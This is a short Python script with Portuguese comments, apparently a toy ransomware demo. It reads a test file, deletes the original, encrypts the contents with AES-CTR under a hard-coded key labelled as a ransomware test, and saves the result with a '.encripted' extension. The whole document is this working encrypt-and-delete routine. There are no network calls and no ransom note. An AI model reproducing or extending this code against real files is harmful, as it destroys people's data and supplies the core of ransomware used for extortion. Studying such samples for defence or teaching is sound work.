import os
import pyaes

# Abrir o arquivo a ser criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()


## Remover o arquivo original
os.remove(file_name)

## Definir a chave de criptografia

key = b"ramsowareteste12"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar os dados
crypto_data = aes.encrypt(file_data)

## Salvar os dados criptografados em um novo arquivo
new_file = file_name + ".encripted"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
